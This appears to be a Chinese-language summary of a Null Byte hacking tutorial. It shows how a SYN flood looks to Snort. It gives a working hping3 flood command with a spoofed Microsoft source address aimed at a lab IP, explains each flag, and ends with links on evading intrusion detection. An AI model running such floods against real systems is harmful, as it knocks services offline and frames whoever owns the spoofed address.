## Digital Forensics , Part 4 (Evading Detection While DoSing)

### Open Up Snort

`snort -vde -c /etc/snort/snort.conf` [^1]

- hping3 [^2]  [ref](https://null-byte.wonderhowto.com/how-to/hack-like-pro-conduct-active-reconnaissance-your-target-with-hping3-0148092/)

### Use a SYN Flood Attack & Spoof Your IP Address [^3]

`hping3 -S -a 65.55.58.201 192.168.1.101 -p 80 --flood` [^4]

### Check the Alerts

`tail -50 /var/log/snort/alert` [^5]

### Reference Microsoft's Security Bulletins

- [微软的Technet公告](http://technet.microsoft.com/en-us/security/bulletin/ms01-059)
- [直接从Microsoft查找最新的漏洞和漏洞](https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-latest-exploits-and-vulnerabilities-directly-from-microsoft-0147354/)

---

### Refer

- [使用Snort躲避NIDS](https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-network-intrusion-detection-system-nids-using-snort-0148051/)

- [snort指南](../Snort/Snort1.md)

- [阅读和编写Snort规则](https://null-byte.wonderhowto.com/how-to/hack-like-pro-read-write-snort-rules-evade-nids-network-intrusion-detection-system-0148215/)

[原文](https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-4-evading-detection-while-dosing-0150445/)

---

[^1]: Snort将开始嗅探线路上的流量并分析它以获取恶意流量的签名。
[^2]: 一种多功能工具，我将其称为“数据包制作工具”，因为它能够使我们创建可以想象的任何类型的数据包
[^3]: 最简单的DoS攻击是SYN泛洪攻击，它在目标上发送数百万个TCP数据包并设置了SYN标志，实质上是要求系统建立TCP连接。它永远不会创建TCP连接，因此服务器永远不会记录IP地址（记录所有成功的连接）。它占用了网络上的所有带宽以及所有连接队列，因此无法建立新的连接
[^4]: **-S** 是包标志类型（SYN）；**-a** 欺骗地址；**65.55.58.201**是欺骗性IP地址（微软）；**-p 80** 发送数据包的端口；**--flood** 尽可能快地发送数据包
[^5]: 查看Snort警报的最后50行